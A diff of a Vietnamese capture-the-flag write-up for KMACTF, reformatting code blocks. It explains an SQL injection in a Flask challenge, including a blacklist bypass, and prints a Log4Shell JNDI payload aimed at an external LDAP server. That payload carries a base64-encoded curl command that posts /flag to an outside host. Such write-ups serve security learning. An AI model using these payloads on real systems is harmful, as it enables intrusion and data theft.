@@ -15,7 +15,9 @@ Flag: `KMACTF{I wont run away anymore. I wont go back on my word. That is my nin
 
 ## Challenge Inject me
 Được cung cấp source code như sau:
-```python
+
+{% highlight text %}
+{% raw %}
 from flask import Flask, render_template, render_template_string, request
 import sqlite3
 import re
@@ -82,15 +84,17 @@ def source():
 if __name__ == '__main__':
     init_db()
     app.run(HOST, PORT, debug=True)
-```
+{% endraw %}
+{% endhighlight %}
+
 + Đoạn code trên có sử dụng `render_template_string` nhưng input nhập vào không được đưa vô hàm này.
 + Độ dài của đầu vào không được quá 85 và không được sử dụng `union`
 + Không chứa 1 trong các kí tự nằm trong `black_list = ["'", '"', '*', '\\', '/', '#', ';', '-']`
-+ Có 1 route `/query` nhận tham số là query và sau đó truyền vào query sql `SELECT msg FROM ' + query + ' where msg like "MSG-%" and msg not like "%KMACTF{%" limit 1` => có thể SQL Injection
++ Có 1 route `/query` nhận tham số là query và sau đó truyền vào query sql {% raw %}`SELECT msg FROM ' + query + ' where msg like "MSG-%" and msg not like "%KMACTF{%" limit 1`{% endraw %} => có thể SQL Injection
 + Ở đây không cần escape để thoát khỏi câu query nên blacklist ở trên đối với mình hiện tại coi như là vô dụng.
 + Để `result` in ra màn hình thì 2 điều kiện này cần phải đúng:
-    + `msg like "MSG-%"` -> kết quả trả về phải có `MSG-`
-    + `msg not like "%KMACTF{%"` -> không được chứa format flag
+    + {% raw %}`msg like "MSG-%"`{% endraw %} -> kết quả trả về phải có `MSG-`
+    + {% raw %}`msg not like "%KMACTF{%"`{% endraw %} -> không được chứa format flag
 
 ## Exploit
 - Vì blacklist có chứa `'` và `"` nên việc tạo ra chuỗi `MSG-` không thể sử dụng theo cách này
@@ -100,7 +104,7 @@ if __name__ == '__main__':
 
 Giải thích về payload trên:
 + Nối chuỗi `MSG-` với thông tin mình cần leak ra xong `AS` vô cột `msg`
-+ Khi đó sẽ qua được 2 điều kiện `msg like "MSG-%"` và `msg not like "%KMACTF{%"`
++ Khi đó sẽ qua được 2 điều kiện {% raw %}`msg like "MSG-%"`{% endraw %} và {% raw %}`msg not like "%KMACTF{%"`{% endraw %}
 
 Payload leak table_name
 ```
@@ -265,11 +269,9 @@ Mọi người thay IP VPS vào chỗ bị bôi bỏ
 :::
 
 Payload send để lấy flag
-{% highlight text %}
-{% raw %}
+```
 ${jndi:ldap://165.22.109.11:1389/Deserialization/CommonsCollectionsK1/Command/Base64/Y3VybCAtZCBAL2ZsYWcgaHR0cDovL3N1cWw0bWF0LnJlcXVlc3RyZXBvLmNvbQ==}
-{% endraw %}
-{% endhighlight %}
+```
 
 Trong đó: `3VybCAtZCBAL2ZsYWcgaHR0cDovL3N1cWw0bWF0LnJlcXVlc3RyZXBvLmNvbQ==` là `curl -d @/flag http://suql4mat.requestrepo.com`
 
